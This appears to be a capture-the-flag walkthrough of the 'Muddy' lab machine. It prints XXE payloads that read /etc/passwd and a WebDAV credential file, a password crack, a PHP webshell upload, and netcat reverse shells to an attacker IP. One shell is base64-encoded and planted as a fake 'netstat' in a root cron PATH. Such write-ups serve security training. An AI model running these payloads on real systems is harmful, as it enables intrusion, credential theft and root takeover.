# Muddy

### Enumeration

```
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
...
8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
|_http-server-header: WSGIServer/0.1 Python/2.7.16
|_http-title: Ladon Service Catalog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

```
$ gobuster dir -u http://muddy.ugc -w /usr/share/wordlists/dirb/big.txt
/webdav               (Status: 401) [Size: 456]
```

```
 http://192.168.84.161:8888 -> Powered by Ladon for Python
 
 $ searchsploit ladon
 $ searchsploit -m xml/webapps/43113.txt
```

Main name: muddy -> urn: checkout (soap11 description) -> Change related parts

Enumerated related parts with exploring the website.

```
$  curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://192.168.84.161:8888/muddy/soap11/checkout\"' \
--data-binary $'<soapenv:Envelope
xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:muddy\"><soapenv:Header/><soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">RedTeam Pentesting</uid>
</urn:checkout></soapenv:Body></soapenv:Envelope>' \
'http://192.168.84.161:8888/muddy/soap11' | xmllint --format -

Response:
<result>
Serial number: 
RedTeam Pentesting
</result>
 
$  curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://192.168.84.161:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:muddy\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://192.168.84.161:8888/muddy/soap11' | xmllint --format -

<result>Serial number: 
root:x:0:0:root:/root:/bin/bash
ian:x:1000:1000::/home/ian:/bin/sh
</result>
```

**/var/www/html/webdav/passwd.dav -> via Apache Configuration File**

```
$  curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://192.168.84.161:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///var/www/html/webdav/passwd.dav">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:muddy\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://192.168.84.161:8888/muddy/soap11' | xmllint --format -

<result>
Serial number: 
administrant:$apr1$[REDACTED]
</result>
```

```
$ hashcat -m 1600 -w 4 -a 0 hash.txt ~/Desktop/rockyou.txt --force

administrant:[REDACTED]
```

### Initial Access

```
$ davtest -url http://muddy.ugc/webdav/ -auth administrant:[REDACTED] -cleanup

Executes: http://muddy.ugc/webdav/DavTestDir_Uzlhn8hbsATX/davtest_Uzlhn8hbsATX.php
```

https://www.revshells.com/ - PHP cmd

```
$ davtest -url http://muddy.ugc/webdav/ -auth administrant:[REDACTED] -uploadfile webshell.php -uploadloc webshell.php

http://muddy.ugc/webdav/webshell.php?cmd=id

nc -e /bin/bash 192.168.49.84 80 -> Execute
```

### PrivEsc

```
www-data@muddy:/$ cat /etc/crontab
PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status

www-data@muddy:/$ ls -lha /dev/shm
drwxrwxrwt  2 root     root       60 Dec 19 22:22 .
```

Writable cronjob path and using relative path.

https://www.revshells.com/ - nc mkfifo

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.84 80 >/tmp/f
# Base64 Encoded
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS44NCA4MCA+L3RtcC9m

www-data@muddy:/dev/shm$ echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC40OS44NCA4MCA+L3RtcC9m" | base64 -d > netstat

www-data@muddy:/dev/shm$ chmod +x netstat
```
